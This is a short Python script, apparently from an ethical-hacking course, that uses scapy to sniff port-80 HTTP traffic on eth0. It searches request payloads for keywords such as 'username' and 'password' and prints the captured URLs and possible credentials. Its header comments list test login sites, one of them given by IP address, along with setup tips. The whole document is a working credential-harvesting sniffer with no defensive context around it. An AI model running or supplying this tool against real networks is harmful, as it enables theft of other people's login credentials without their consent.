# test website http
# http://vbsca.ca/login/login.asp
# http://193.206.192.119/fgas_v2/login.php
# scapy.sniff use bpf syntax, unfortunately this is not useful to filter http
# pip install scapy_http
# by default terminal allow to go back 500 lines right click->profile->scrolling


import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")


def get_url(packet):
    return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)


def get_login_info(packet):
    load = str(packet[scapy.Raw].load)
    keywords = ["username", "user", "loging", "password", "pass", "Username", "Password"]
    for keyword in keywords:
        if keyword in load:
            return load
    return ""


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            login = get_login_info(packet)
            if login:
                url = get_url(packet)
                print("[+] HTTP Request >> " + url)
                print("[+] Possible username/password > " + login + "\n\n")


if __name__ == "__main__":
    sniff("eth0")
